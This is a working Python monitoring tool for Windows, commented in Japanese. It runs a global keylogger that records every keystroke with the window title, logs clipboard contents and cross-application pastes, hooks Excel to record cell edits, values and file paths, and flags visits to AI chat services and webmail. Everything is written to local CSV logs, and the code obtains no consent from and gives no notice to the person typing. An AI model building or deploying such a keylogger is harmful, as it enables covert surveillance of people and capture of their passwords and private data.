import time
import datetime
import csv
import os
import threading
import queue
import psutil
import pyperclip
import win32gui
import win32process
import pythoncom
import win32com.client
from pynput import keyboard
import logging

# ==========================================
# グローバル設定
# ==========================================
stop_event = threading.Event()
log_queue = queue.Queue()

# ==========================================
# アクティブウィンドウ情報の取得
# ==========================================
pid_cache = {}

def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        
        # 毎秒 psutil を呼ぶと重いためキャッシュを活用
        if pid not in pid_cache:
            try:
                proc = psutil.Process(pid)
                pid_cache[pid] = proc.name()
            except psutil.NoSuchProcess:
                return "Unknown", title
                
        return pid_cache[pid], title
    except Exception:
        return "Unknown", "Unknown"

# ==========================================
# ログ書き込み（キューへの投入：非同期用）
# ==========================================
def log_system_event(base_dir, app_name, event_type, target, metadata):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # すぐにファイルを開かず、インメモリのキューに放り込んでExcelに即座に処理を返す
    log_queue.put((app_name, event_type, target, metadata, timestamp, base_dir))

# ==========================================
# バックグラウンド書き込みスレッド
# ==========================================
def log_writer_thread():
    # キューに溜まったログを順次ファイルに書き出す（ディスクI/Oによる遅延を吸収）
    while not stop_event.is_set() or not log_queue.empty():
        try:
            item = log_queue.get(timeout=1.0)
        except queue.Empty:
            continue
            
        app_name, event_type, target, metadata, timestamp, base_dir = item
        
        target_date = datetime.datetime.strptime(timestamp, "%Y-%m-%d %H:%M:%S").strftime("%Y%m%d") if timestamp else datetime.datetime.now().strftime("%Y%m%d")
        log_dir = base_dir if base_dir else os.path.join(os.path.dirname(__file__), "activity_logs")
        os.makedirs(log_dir, exist_ok=True)
        
        log_file = os.path.join(log_dir, f"system_log_{target_date}.csv")
        file_exists = os.path.exists(log_file)
        
        try:
            with open(log_file, "a", newline="", encoding="utf-8-sig") as f:
                # Excelがアクティブな場合は、シート名とセル番地を強制的にMetaに追記する
                if "excel" in app_name.lower():
                    active_info = get_excel_active_info()
                    if active_info:
                        metadata = f"{metadata} | {active_info}" if metadata else active_info
                
                writer = csv.writer(f)
                if not file_exists:
                    writer.writerow(["Timestamp", "ActiveApp", "EventType", "TargetName", "Metadata"])
                writer.writerow([timestamp, app_name, event_type, target, metadata])
        except Exception:
            pass
        finally:
            log_queue.task_done()

# ==========================================
# Excelイベント傍受用クラス (win32com)
# ==========================================
class ExcelEventListener:
    base_dir = ""
    
    @classmethod
    def log(cls, event_type, target, metadata):
        log_system_event(cls.base_dir, "excel.exe", event_type, target, metadata)

    def OnWorkbookOpen(self, Wb):
        self.log("WorkbookOpen", Wb.Name, "")

    def OnWorkbookBeforeSave(self, Wb, SaveAsUI, Cancel):
        self.log("WorkbookSave", Wb.Name, "")

    def OnSheetChange(self, Sh, Target):
        # 【重要】マクロによる連続書き換え検知（デバウンス処理）
        if not hasattr(self, 'last_change_time'):
            self.last_change_time = 0
            
        current_time = time.time()
        # 専用スレッド化によりラグが解消されたため、間引き間隔を短く(0.1秒)し、詳細な操作を拾う
        if current_time - self.last_change_time < 0.1:
            return  
            
        self.last_change_time = current_time

        try:
            # COMオブジェクトからのプロパティ取得はエラーになりやすいため、個別にtry-exceptで安全に取得する
            try:
                sheet_name = Sh.Name
            except Exception:
                sheet_name = "Unknown"
                
            try:
                address = Target.Address
            except Exception:
                address = "Unknown"
                
            try:
                # 巨大な範囲の変更（数千〜数百万セルの一括コピペ等）の場合は、文字列化処理でフリーズ・パンクするためスキップ
                try:
                    cell_count = Target.CountLarge
                except Exception:
                    cell_count = 1
                    
                if cell_count > 100:
                    formula = ""
                    cell_value = f"({cell_count}セルの大量一括更新)"
                else:
                    formula = str(Target.Formula)[:100]
                    cell_value = str(Target.Value)[:100].replace("\n", " ")
            except Exception:
                formula = ""
                cell_value = ""
            
            if formula.startswith("="):
                meta = f"Sheet:{sheet_name}, Cell:{address}, Formula:{formula}, Value:{cell_value}"
            else:
                meta = f"Sheet:{sheet_name}, Cell:{address}, Value:{cell_value}"
                
            self.log("SheetChange", "Excel", meta)
        except Exception as e:
            print(f"[Error] Excel Logging: {e}")

# ==========================================
# Excel専用の超高速・非同期監視スレッド
# ==========================================
def excel_com_thread(base_dir):
    pythoncom.CoInitialize()
    excel_hooked = False
    
    while not stop_event.is_set():
        if not excel_hooked:
            app_name, _ = get_active_window_info()
            if "excel" in app_name.lower():
                try:
                    excel_app = win32com.client.GetActiveObject("Excel.Application")
                    excel_events = win32com.client.WithEvents(excel_app, ExcelEventListener)
                    excel_hooked = True
                    print("【システムロガー】Excelにアタッチ成功（ラグなし専用スレッド）。")
                except Exception:
                    pass
        
        if excel_hooked:
            # 10ms(0.01秒)間隔でメッセージを処理し、Excel側の待ち時間を極限まで無くす
            pythoncom.PumpWaitingMessages()
            time.sleep(0.01)
        else:
            time.sleep(1)
            
    pythoncom.CoUninitialize()

# --- 追加：Excelのアクティブセル・フィルター情報を強制取得 ---
def get_excel_active_info():
    try:
        # 既に起動しているExcelのCOMオブジェクトを取得
        excel = win32com.client.GetActiveObject("Excel.Application")
        if excel:
            wb = excel.ActiveWorkbook
            sh = excel.ActiveSheet
            selection = excel.Selection
            
            if wb and sh and selection:
                # ファイルパス、シート、選択範囲
                info = f"File:{wb.FullName}, Sheet:{sh.Name}, Selection:{selection.Address.replace('$', '')}"
                
                # フィルターがかかっているかチェック
                if sh.AutoFilterMode and sh.AutoFilter:
                    filters = sh.AutoFilter.Filters
                    filter_info = []
                    for i in range(1, filters.Count + 1):
                        f = filters(i)
                        if f.On:
                            try:
                                # Criteria1などを取得 (複数条件や配列の場合はエラーになることがあるので簡易取得)
                                filter_info.append(f"Col{i}={f.Criteria1}")
                            except Exception:
                                filter_info.append(f"Col{i}=Filtered")
                    if filter_info:
                        info += f", Filter:[{', '.join(filter_info)}]"
                
                # 並び替え判定 (Sort)
                try:
                    if sh.Sort.SortFields.Count > 0:
                        info += f", Sorted:True"
                except Exception:
                    pass
                    
                # セルの色と非表示行（メタデータ）の取得
                try:
                    active_cell = excel.ActiveCell
                    color = active_cell.Interior.Color
                    # 白(16777215)以外なら色情報を記録
                    if color != 16777215 and color != 0:
                        info += f", Color:{color}"
                    
                    if active_cell.EntireRow.Hidden:
                        info += f", HiddenRow:True"
                except Exception:
                    pass
                
                return info
    except Exception:
        pass
    return ""
# ------------------------------------------------

# ==========================================
# 物理キーロガー（打鍵監視）スレッド
# ==========================================
key_buffer = []
last_key_time = time.time()

def on_press(key):
    global key_buffer, last_key_time
    try:
        if hasattr(key, 'char') and key.char:
            # 制御文字（Ctrl+Cなど）を人間が読める形式に変換
            char = key.char
            if char == '\x03': key_buffer.append("[Ctrl+C]")
            elif char == '\x16': key_buffer.append("[Ctrl+V]")
            elif char == '\x18': key_buffer.append("[Ctrl+X]")
            elif char == '\x1a': key_buffer.append("[Ctrl+Z]")
            elif char == '\x01': key_buffer.append("[Ctrl+A]")
            elif char == '\x13': key_buffer.append("[Ctrl+S]")
            elif char == '\x06': key_buffer.append("[Ctrl+F]")
            else: key_buffer.append(char)
        else:
            key_buffer.append(f"[{key.name}]")
    except Exception:
        pass
    last_key_time = time.time()

def keylogger_thread(base_dir):
    global key_buffer, last_key_time
    
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    while not stop_event.is_set():
        # 1.5秒間キー入力が途絶えたら、そこまでをひとまとまりとして記録
        if len(key_buffer) > 0 and (time.time() - last_key_time > 1.5):
            keys_str = "".join(key_buffer)
            app_name, title = get_active_window_info()
            if keys_str.strip():
                log_system_event(base_dir, app_name, "KeyLog", title, f"Keys:{keys_str}")
            key_buffer = []
        time.sleep(0.5)

# ==========================================
# メインの監視スレッド
# ==========================================
def main(base_dir=None):
    print("【システムロガー】起動しました。（非同期・軽量版）")
    
    ExcelEventListener.base_dir = base_dir
    
    # 書き込み専用スレッドの起動
    writer_thread = threading.Thread(target=log_writer_thread, daemon=True)
    writer_thread.start()
    
    # Excel COM専用スレッドの起動
    excel_thread = threading.Thread(target=excel_com_thread, args=(base_dir,), daemon=True)
    excel_thread.start()
    
    # 物理キーロガー専用スレッドの起動
    key_thread = threading.Thread(target=keylogger_thread, args=(base_dir,), daemon=True)
    key_thread.start()
    
    # COM初期化
    pythoncom.CoInitialize()
    
    last_clipboard = ""
    last_active_app = ""
    source_app_of_clipboard = ""
    
    while not stop_event.is_set():
        try:
            # 1. アクティブアプリとAI/Webメール利用の検知
            app_name, title = get_active_window_info()
            browser_names = ["chrome.exe", "msedge.exe", "firefox.exe"]
            ai_keywords = ["ChatGPT", "Claude", "Gemini", "Copilot", "Perplexity"]
            mail_keywords = ["Gmail", "Outlook", "Yahoo"]
            
            if app_name.lower() in browser_names:
                for keyword in ai_keywords:
                    if keyword.lower() in title.lower():
                        app_name = f"AI({keyword})"
                        break
                for keyword in mail_keywords:
                    if keyword.lower() in title.lower():
                        app_name = f"WebMail({keyword})"
                        break

            # 2. アプリ切り替えによる「転記（ペースト可能性）」の検知
            if app_name != last_active_app and last_active_app != "":
                if source_app_of_clipboard and source_app_of_clipboard != app_name and last_clipboard:
                    snippet = last_clipboard[:50].replace('\n', ' ').replace('\r', ' ')
                    log_system_event(base_dir, app_name, "PotentialTransfer (Paste)", title, f"Source: {source_app_of_clipboard}, Data:[{snippet}...]")
            
            last_active_app = app_name

            # 3. クリップボードの監視（コピー元アプリの記憶）
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard:
                last_clipboard = current_clipboard
                source_app_of_clipboard = app_name
                if current_clipboard:
                    size = len(current_clipboard)
                    snippet = current_clipboard[:100].replace('\n', ' ').replace('\r', ' ')
                    log_system_event(base_dir, app_name, "Copy", title, f"Size:{size} chars, Data:[{snippet}...]")

        except Exception as e:
            logging.error(f"【SystemLogger MainLoop Error】: {e}", exc_info=True)
            
        pythoncom.PumpWaitingMessages()
        stop_event.wait(1)
        
    pythoncom.CoUninitialize()
    
    # スレッド停止後、残りのキューを書き切るのを待つ
    log_queue.join()
    print("【システムロガー】終了しました。")

if __name__ == "__main__":
    main()
